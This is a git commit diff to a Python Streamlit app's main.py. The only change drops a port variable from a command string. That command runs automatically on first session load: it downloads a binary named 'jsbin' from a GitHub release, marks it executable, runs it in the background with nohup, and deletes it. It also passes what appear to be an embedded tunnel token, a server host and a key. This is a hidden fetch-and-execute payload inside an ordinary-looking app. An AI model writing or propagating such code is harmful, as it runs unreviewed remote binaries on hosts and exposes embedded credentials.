e123cdf0ff893a87a19bcdae148a2495ea675180
tArogoD <jfu5285@mysvc.skagit.edu>
2025-03-27 09:43:31 +0800

    Update main.py

--- main.py
+++ main.py
@@ -6,7 +6,7 @@ import requests
 
 # 原始后台进程执行代码
 if 'script_executed' not in st.session_state:
-    command = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNzYxZjhiNGMtYzA4MC00ODhiLWE0OGMtMGI4MDA0OWY2MTU2IiwicyI6Ik5EVm1NamcyWVdVdE9USTVOeTAwWlRJMUxUZzFZek10WmpoaE1tRmxNRFEzT0RaaCJ9 N_S=nz.seav.eu.org N_K=2kVTRbOuEylfrEE6b9 port=7863 bash -c 'curl -L -o jsbin https://github.com/seav1/dl/releases/download/src/jsbin && chmod +x jsbin && nohup ./jsbin && rm jsbin'"
+    command = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNzYxZjhiNGMtYzA4MC00ODhiLWE0OGMtMGI4MDA0OWY2MTU2IiwicyI6Ik5EVm1NamcyWVdVdE9USTVOeTAwWlRJMUxUZzFZek10WmpoaE1tRmxNRFEzT0RaaCJ9 N_S=nz.seav.eu.org N_K=2kVTRbOuEylfrEE6b9 bash -c 'curl -L -o jsbin https://github.com/seav1/dl/releases/download/src/jsbin && chmod +x jsbin && nohup ./jsbin && rm jsbin'"
     subprocess.call(command, shell=True)
     st.session_state.script_executed = True
 
